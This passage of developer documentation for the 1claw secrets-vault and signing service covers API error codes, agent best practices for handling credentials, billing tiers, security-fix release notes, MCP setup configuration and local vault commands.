| ---- | ---------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 400  | Bad request                                                | Check request body format                                                                                                                                                                         |
| 401  | Not authenticated                                          | Token expired — re-authenticate                                                                                                                                                                   |
| 402  | Quota exhausted / payment required                         | Body may include `required_usd`, `message`. Signature overage is a flat per-signature rate; top up credits or send X-PAYMENT. Otherwise upgrade at `1claw.xyz/settings/billing` |
| 403  | No permission                                              | Ask user to grant access via a policy. Or: guardrail violation (check error detail)                                                                                                               |
| 403  | Resource limit reached (`type: "resource_limit_exceeded"`) | Tier limit on vaults/secrets/agents hit — ask user to upgrade at `1claw.xyz/settings/billing`                                                                                                     |
| 404  | Not found                                                  | Check path with `list_secrets`                                                                                                                                                                    |
| 405  | Method not allowed                                         | Wrong HTTP verb for this endpoint                                                                                                                                                                 |
| 409  | Conflict                                                   | Resource already exists (e.g. duplicate vault name)                                                                                                                                               |
| 410  | Gone                                                       | Secret expired or max access count reached — ask user to store a new version                                                                                                                      |
| 422  | Validation error or simulation reverted                    | Check input. For `simulate_first`: transaction would revert                                                                                                                                       |
| 413  | Payload too large                                          | Request body over 5MB — reduce payload size                                                                                                                                                       |
| 429  | Rate limited / account locked                              | Wait and retry. Auth routes: 5 req burst, 1/sec. Share creation: 10/min/org. Login lockout: 15 min after 10 failed attempts                                                                       |

All error responses include a `detail` field with a human-readable message.

---

## Best Practices

1. **Fetch secrets just-in-time.** Call `get_secret` immediately before the API call that needs the credential.
2. **Never echo secret values.** Say "I retrieved the API key and used it" — never include raw values in responses.
3. **Use `describe_secret` first** to check existence or validity before fetching the full value.
4. **Use `list_secrets` to discover** available credentials before guessing paths.
5. **Rotate after regeneration.** If you regenerate an API key at a provider, immediately `rotate_and_store` the new value.
6. **Use `grant_access` for vault-level sharing** — creates a fine-grained policy with path patterns.
7. **Use `share_secret` for one-off sharing** — creates a time-limited, access-counted share link.
8. **Simulate before signing.** Always use `simulate_first: true` (default) or call `simulate_transaction` before `submit_transaction`.
9. **Check `list_vaults` before creating.** Avoid creating duplicate vaults.
10. **Handle 402 gracefully.** Billing/quota errors should be surfaced to the user, not retried.

---

## Billing Tiers

| Tier       | API calls/mo | Wallets   | Signatures/mo | Vaults    | Secrets   | Agents    | Price                                        |
| ---------- | ------------ | --------- | ------------- | --------- | --------- | --------- | -------------------------------------------- |
| Free       | 1,000        | 10        | 100           | 3         | 50        | 2         | $0                                           |
| Pro        | 20,000       | 10,000    | 20,000        | 5         | 500       | 10        | $29/mo                                       |
| Team       | 200,000      | 250,000   | 200,000       | 100       | 5,000     | 50        | $299/mo (SSO, Platform API)                  |
| Business   | 1,000,000    | 1,000,000 | 1,000,000     | Unlimited | Unlimited | 200       | $999/mo (+ CMEK, Intents, Shroud Enterprise, Treasury Wallets) |
| Enterprise | Unlimited    | Unlimited | Unlimited     | Unlimited | Unlimited | Unlimited | Contact                                      |

Overage methods: **prepaid credits** (top up via Stripe, deducted per request) or **x402 micropayments** (per-query on-chain payments on Base). Signature overage is a flat per-signature charge (not a percent of transaction value). Signing POSTs do not consume the API Calls meter. Treasury wallets are available on all tiers and count toward wallet quota.

Audit, org, security, chain, billing, and auth endpoints are **free and never consume quota**.

---

## Security Hardening (v0.22.1 / v0.20.4)

- **Treasury signing authorization** (v0.22.1, CRITICAL): Intents API treasury mode requires active delegation verification.
- **Delegation guardrails enforcement** (v0.22.1): Per-delegation spend caps, address allowlists, and chain restrictions now enforced.
- **Webhook SSRF protection** (v0.22.1): Destination URL validation and redirect blocking in webhook dispatcher.
- **Proposal signer auth** (v0.22.1): `sign_proposal` requires treasury signer or proposal creator role.
- **Delegation mode filter** (v0.22.1): Only `delegated`/`both` mode delegations accepted for direct Intents API signing.
- **Treasury send/swap lockout** (v0.22.1): Password brute-force on send/swap triggers account lockout.
- **Scope validation** (EXT-C1): Agent scopes must be glob patterns (`secrets/*`), not permission strings (`vault.read`).
- **Error sanitization** (EXT-L1): `sanitize_errors_middleware` replaces serde error details in 400/422 responses.
- **Opaque Shroud redaction** (EXT-H1): Labels use SHA-256 hash prefix (`[REDACTED:#a1b2c3d4]`), not vault paths.
- **JWT revocation on deletion** (EXT-H2): Agent deletion revokes all active JWTs.
- **Idempotency body hash** (EXT-H3): Same `Idempotency-Key` with different body → 409 Conflict.
- **Redaction entropy floor** (EXT-H4): Secrets < 8 chars or entropy < 3.0 excluded from Shroud automata.
- **Bootstrap signing keys** (v0.20.3): Template `spec.signing_keys` auto-provisions per-chain keys.

### Onboarding golden path (v0.59.2)

- **`GET /v1/org/onboarding/status`** — welcome bundle progress (human JWT).
- **`POST /v1/onboarding/provision`** — creates `default` vault, `examples/hello`, MCP agent, `**` policy; returns one-time `ocv_` key + stdio `mcp_stdio_config`.
- **`1claw setup`** — login + provision + auto-configure Cursor/Claude/VS Code for stdio MCP (`npx @1claw/mcp` + `ONECLAW_AGENT_API_KEY`).
- **Dashboard** — `/onboarding/connect` wizard after signup.
- **Canonical stdio MCP config:**

```json
{
  "mcpServers": {
    "1claw": {
      "command": "npx",
      "args": ["-y", "@1claw/mcp"],
      "env": {
        "ONECLAW_AGENT_API_KEY": "ocv_...",
        "ONECLAW_BASE_URL": "https://api.1claw.xyz"
      }
    }
  }
}
```

### Local Vault & Daemon (v0.34.2)

- **`1claw local`**: Encrypted local vault (AES-256-GCM, PBKDF2). Subcommands: `init`, `add`, `get`, `rm`, `list`, `import`, `export`, `sync`, `status`, `destroy`. File: `~/.config/1claw/local-vault.enc`.
- **`1claw daemon`**: Unix socket daemon (`daemon.sock`) serving secrets over HTTP. `POST /proxy` injects secrets into HTTP requests per policy rules — the AI model never sees raw values.
- **`1claw daemon policy`**: Per-secret host allowlist. `add <secret> --hosts <hosts>` / `list` / `remove`. Fail-closed: no policy = no injection.
- **`1claw setup --local`**: Configures AI clients for local daemon mode (`ONECLAW_LOCAL_VAULT=true`).
- **MCP local mode**: `proxy_request` tool sends HTTP requests with secret injection; `list_secrets` shows names only.

---

## Links

- Dashboard: [1claw.xyz](https://1claw.xyz)
- Docs: [docs.1claw.xyz](https://docs.1claw.xyz)
- Status: [1claw.xyz/status](https://1claw.xyz/status)
- API: `https://api.1claw.xyz`
- SDK: [@1claw/sdk on npm](https://www.npmjs.com/package/@1claw/sdk)
- OpenAPI Spec: [@1claw/openapi-spec on npm](https://www.npmjs.com/package/@1claw/openapi-spec)
- MCP Server: [@1claw/mcp on npm](https://www.npmjs.com/package/@1claw/mcp)
- CLI: [@1claw/cli on npm](https://www.npmjs.com/package/@1claw/cli)
- GitHub: [github.com/1clawAI](https://github.com/1clawAI)
- Support: [ops@1claw.xyz](mailto:ops@1claw.xyz)